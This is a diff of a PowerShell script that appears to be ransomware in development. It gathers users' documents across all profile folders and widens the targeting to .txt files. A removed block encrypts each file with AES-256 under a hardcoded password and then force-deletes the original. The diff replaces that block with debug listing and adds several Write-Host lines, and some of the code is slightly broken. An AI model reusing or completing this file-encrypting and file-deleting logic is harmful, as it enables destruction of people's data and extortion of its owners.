@@ -101,19 +101,25 @@ function Find-UserFiles
  
     $foundFiles = @()
  
-    $extensions = @("*.docx", "*.xlsx", "*.pptx")
+    $extensions = @("*.docx", "*.xlsx", "*.pptx", "*.txt")
  
    
+    Write-Host "Name: $_.Name"
  
     $dirs = Get-ChildItem -Path $userRoot -Directory | Where-Object { $excludeDirs -notcontains $_.Name }
  
+    Write-Host "Analyze $dirs"
    
  
     foreach ($dir in $dirs) {
+        
+        Write-Host "Checking $dir"
  
         foreach ($ext in $extensions) {
+
+            Write-Host "Checking for $ext"
  
-            $files = Get-ChildItem -Path $dir.FullName -Recurse -File -Filter $ext -ErrorAction SilentlyContinue
+            $files = Get-ChildItem -Path "C:\Users\$dir" -Recurse -Filter $ext -ErrorAction SilentlyContinue
  
             $foundFiles += $files
  
@@ -131,23 +137,7 @@ function Find-UserFiles
 $password = "MojeSuperTajneHaslo"
  
 $filesToEncrypt = Find-UserFiles
- 
- 
-foreach ($file in $filesToEncrypt)
- 
-{
- 
-    # file encrypt .enc
- 
-    $outputFile = "$($file.FullName).enc"
- 
-    Write-Output "Encrypting $($file.FullName)" #debug
- 
-    Encrypt-FileAES256 -InputFile $file.FullName -OutputFile $outputFile -Password $password
- 
-   Remove-Item -Path $file.FullName -Force
- 
-}
- 
+
+Write-Host "Show file to encrypt: $filesToEncrypt"
+
 Write-Output "END"
- 
